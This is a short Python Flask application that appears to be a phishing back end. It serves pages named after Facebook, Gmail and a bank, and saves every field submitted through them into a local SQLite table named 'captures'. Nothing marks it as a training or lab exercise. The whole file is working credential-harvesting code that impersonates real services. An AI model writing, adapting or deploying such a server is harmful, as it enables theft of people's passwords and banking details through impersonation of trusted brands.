from flask import Flask, render_template, request
import sqlite3
import os

app = Flask(__name__)

DB_FILE = "captured_data.db"

# Create table if it doesn't exist
def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("""
        CREATE TABLE IF NOT EXISTS captures (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            site TEXT,
            field_name TEXT,
            field_value TEXT
        )
    """)
    conn.commit()
    conn.close()

def save_data(site, form_data):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    for field, value in form_data.items():
        c.execute("INSERT INTO captures (site, field_name, field_value) VALUES (?, ?, ?)",
                  (site, field, value))
    conn.commit()
    conn.close()

@app.route('/', methods=['GET', 'POST'])
def facebook():
    if request.method == 'POST':
        save_data("Facebook", request.form)
    return render_template("facebook.html")

@app.route('/gmail', methods=['GET', 'POST'])
def gmail():
    if request.method == 'POST':
        save_data("Gmail", request.form)
    return render_template("gmail.html")

@app.route('/bank', methods=['GET', 'POST'])
def bank():
    if request.method == 'POST':
        save_data("Bank", request.form)
    return render_template("bank.html")

if __name__ == '__main__':
    init_db()
    app.run(port=5001, debug=True)
